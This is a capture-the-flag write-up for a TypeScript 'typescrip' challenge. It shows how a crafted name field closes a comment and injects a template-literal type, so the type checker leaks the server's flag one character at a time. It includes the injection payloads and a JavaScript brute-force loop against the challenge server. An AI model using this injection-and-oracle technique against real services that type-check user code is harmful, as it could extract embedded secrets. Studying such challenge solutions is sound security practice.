### Challenge
Name: typescrip  
Category: misc  
Difficulty: medium  

### Solution
Run `node index.js` and wait for the flag brute force to complete

### Explanation
Type check the characters of the flag until you have received the entire flag text. We can actually encapsulate the flag in a string by abusing the 
Brute force with name `*/ let a: CTF=`` and code
```
`;type CTF =`${string}bctf{'+a+'${string}}${string}`

```
The server is doing this substitution
```typescript
`/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS "${flag}". */` + "\n\n" + code;
```
Our injection ends up with this source code
```typescript
/* TYPE CHECKED FOR */ let a: CTF=` ON 10/1/2023. THE FLAG IS "bctf{fake_flag}". */
`;type CTF =`${string}bctf{${string}}${string}`
```
Here we can use `${string}` templating to check for any string, bctf{} containing any string, followed by any string.
We can get more and more specific with this injection. For example:
```typescript
/* TYPE CHECKED FOR */ let a: CTF=` ON 10/1/2023. THE FLAG IS "bctf{fake_flag}". */
`;type CTF =`${string}bctf{a${string}}${string}`
```
Will throw an error, but:
```typescript
/* TYPE CHECKED FOR */ let a: CTF=` ON 10/1/2023. THE FLAG IS "bctf{fake_flag}". */
`;type CTF =`${string}bctf{4${string}}${string}`
```
Will be successful, meaning we can derive the first character. For the brute force, we automate the client connection and check for successes and failures:
```javascript
let current = "";
function tryConnectionWithChar(a){/* ... source code ...*/} // updates current if successful
let alpha = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-[]{};".split("");
let i = 0;
let length = 0;
setInterval(function(){
    console.log(current+alpha[i]);
    tryConnectionWithChar(current+alpha[i]);
    i++;
    if(current.length > length){ // current was updated with a correct character, start from beginning
        i = 0;
        length = current.length;
    }
    if(i==alpha.length){ // sometimes the request with the correct character gets rejected, just try again
        i=0;
    }
},200);
```